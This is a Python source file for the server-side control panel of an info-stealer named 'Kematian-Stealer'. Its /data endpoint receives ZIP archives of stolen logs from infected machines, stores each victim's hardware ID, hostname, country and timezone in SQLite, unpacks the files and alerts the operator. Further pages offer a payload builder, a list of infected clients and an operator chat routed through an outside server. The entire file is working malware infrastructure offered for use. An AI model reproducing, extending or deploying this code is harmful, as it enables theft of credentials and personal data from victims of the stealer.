import os
import uuid
import aiohttp
import aiosqlite
import subprocess
import datetime

from panel.ui.modules.first_time.first_time import MakeFiles
from panel.ui.modules.notifications.notifications import Notifications
from panel.ui.modules.settings.settings import Settings
from panel.ui.handlers.logs_handler import LogHandler

from panel.ui.pages.frames.main_frame import frame

from panel.ui.pages.index_page import fr_page
from panel.ui.pages.builder_page import builder
from panel.ui.pages.credits import credits_page
from panel.ui.pages.settings_page import settings_stuff
from panel.ui.pages.clients_page import clients_page_stuff

from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded

from fastapi import FastAPI, File, UploadFile, HTTPException, Request
from fastapi.responses import JSONResponse

from nicegui import ui, app

limiter = Limiter(key_func=get_remote_address)
app = FastAPI()
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)


good_dir = os.getenv("APPDATA")

file_handler = MakeFiles()
file_handler.ensure_all_dirs()


db_path = os.path.join(good_dir, "Kematian-Stealer", "kdot.db")
db_path_graphs = os.path.join(good_dir, "Kematian-Stealer", "graphs.db")

api_base_url = "https://sped.lol"

identifier = uuid.uuid4()

# Notification Handler
NOTIFICATIONS = Notifications()


async def initialize_database_logs():
    """Initialize the database if it doesn't exist."""
    async with aiosqlite.connect(db_path) as db:
        await db.execute(
            """
            CREATE TABLE IF NOT EXISTS entries (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                hwid TEXT UNIQUE,
                country_code TEXT,
                hostname TEXT,
                date TEXT,
                timezone TEXT,
                filepath TEXT
            )
        """
        )
        await db.commit()


async def initialize_database_graphs():
    """Initialize the database if it doesn't exist."""
    async with aiosqlite.connect(db_path_graphs) as db:
        await db.execute(
            """
            CREATE TABLE IF NOT EXISTS graphs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                date TEXT,
                hostname TEXT,
                country_code TEXT
            )
        """
        )
        await db.commit()


@app.on_event("startup")
async def on_startup():
    """Startup event to initialize the database."""
    await initialize_database_logs()
    await initialize_database_graphs()


@app.post("/data")
@limiter.limit("1/hour", error_message="Only 1 request per hour allowed")
async def receive_data(request: Request, file: UploadFile = File(...)) -> JSONResponse:
    """Receive data from the client and store it in the database.

    Args:
        file (UploadFile, optional): File that we receive. Defaults to File(...).

    Raises:
        HTTPException: Raise an exception if the file type is not a ZIP file and not formatted correctly.

    Returns:
        JSONResponse: Return a JSON response with the status of the file.
    """
    if file.content_type != "application/zip":
        raise HTTPException(
            status_code=400, detail="Invalid file type. Only ZIP files are allowed."
        )

    handler = LogHandler(file)
    info = handler.get_file_info()

    custom_path = f"{info['country_code']}-({info['hostname']})-({info['date']})-({info['timezone']})"

    async with aiosqlite.connect(db_path) as db:
        await db.execute(
            """
            INSERT OR REPLACE INTO entries (hwid, country_code, hostname, date, timezone, filepath) 
            VALUES (?, ?, ?, ?, ?, ?)
            """,
            (
                info["hwid"],
                info["country_code"],
                info["hostname"],
                info["date"],
                info["timezone"],
                os.path.join(handler.HWID_folder_dir, custom_path),
            ),
        )
        await db.commit()

    async with aiosqlite.connect(db_path_graphs) as db:
        await db.execute(
            """
            INSERT INTO graphs (date, hostname, country_code) 
            VALUES (?, ?, ?)
            """,
            (
                info["date"],
                info["hostname"],
                info["country_code"],
            ),
        )
        await db.commit()

    out = handler.unzip_file()
    if out:
        NOTIFICATIONS.send_notification(f"New log from {info['hostname']}")
        return JSONResponse(content={"status": "ok"})
    else:
        return JSONResponse(content={"status": "error"})


@ui.page("/")
async def main_page() -> None:
    """Main page for the stealer. Very simple."""
    with frame(True):
        await fr_page()


@ui.page("/builder")
def builder_page() -> None:
    """Builder page for the stealer."""
    with frame():
        builder()


@ui.page("/clients")
async def clients_page() -> None:
    """Clients page for the stealer"""
    with frame(True):
        await clients_page_stuff(db_path)


@ui.refreshable
async def chat_messages(own_id: str, chat_area) -> None:
    """Chat messages for the chat page.

    Args:
        own_id (str): ID of the user
    """
    async with aiohttp.ClientSession() as session:
        async with session.get(f"{api_base_url}/get_messages") as response:
            messages = await response.json()

    for message in messages:
        ui.chat_message(
            text=message["text"],
            stamp=message["stamp"],
            avatar=message["avatar"],
            sent=own_id == message["user_id"],
        )
    chat_area.scroll_to(percent=1)


@ui.page("/chat")
async def main():
    """Chat page for the stealer."""
    with frame(True):

        async def send() -> None:
            stamp = datetime.datetime.now(datetime.UTC).strftime("%X")
            message = {
                "user_id": user_id,
                "avatar": avatar,
                "text": text.value,
                "stamp": stamp,
            }
            text.value = ""
            await post_message(message)
            try:
                await chat_messages.refresh()
            except TypeError:
                return

        async def post_message(message):
            async with aiohttp.ClientSession() as session:
                await session.post(f"{api_base_url}/send_message", json=message)

        user_id = identifier
        avatar = f"https://robohash.org/{user_id}?set=any"

        await ui.context.client.connected()
        with ui.scroll_area().classes(
            "w-full h-full max-w-2xl mx-auto items-stretch"
        ) as chat_area:
            with ui.column().classes(
                "w-full max-w-2xl mx-auto items-stretch"
            ):  # Align messages to the end (right)
                await chat_messages(user_id, chat_area)
            chat_area.scroll_to(percent=1)

        with ui.row().style("height: 50px;"):
            with ui.avatar().on("click", lambda: ui.navigate.to(main)):
                ui.image(avatar)
            text = (
                ui.input(placeholder="message")
                .on("keydown.enter", send)
                .props("rounded outlined input-class=mx-3")
                .classes("flex-grow")
            )


@ui.page("/settings")
def settings() -> None:
    """Settings page for the stealer. (NEEDS TO BE REWORKED OR ATLEAST A NEW UI LMFAO)"""
    with frame(True):
        settings_stuff()


@ui.page("/credits")
def credits_stuff() -> None:
    """Credits page for the stealer."""
    with frame(True):
        credits_page()


ui.run_with(app, title="Kematian-Stealer")

current_settings = Settings()

if not os.path.exists(
    os.path.join(good_dir, "Kematian-Stealer", "keyfile.pem")
) or not os.path.exists(os.path.join(good_dir, "Kematian-Stealer", "certfile.pem")):
    file_handler.fix_key_and_certs()
